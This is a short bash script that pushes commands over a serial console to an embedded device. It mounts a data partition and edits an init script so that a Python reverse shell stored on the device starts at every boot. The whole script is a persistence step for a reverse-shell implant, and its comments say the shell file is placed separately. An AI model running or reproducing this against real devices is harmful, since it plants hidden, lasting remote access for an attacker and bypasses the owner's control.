# /bin/bash
# script requires reverseShell.py to be placed by user
# only adds it to boot
echo "/usr/local/bin/watchdogd" > /dev/ttyUSB0
sleep 1
echo "mount -t ext3 /dev/mmcblk1p8 /var" > /dev/ttyUSB0
sleep 1
echo "sed -i '294 i exec python /var/revShell.py&' /etc/init.d/varlocal.sh" > /dev/ttyUSB0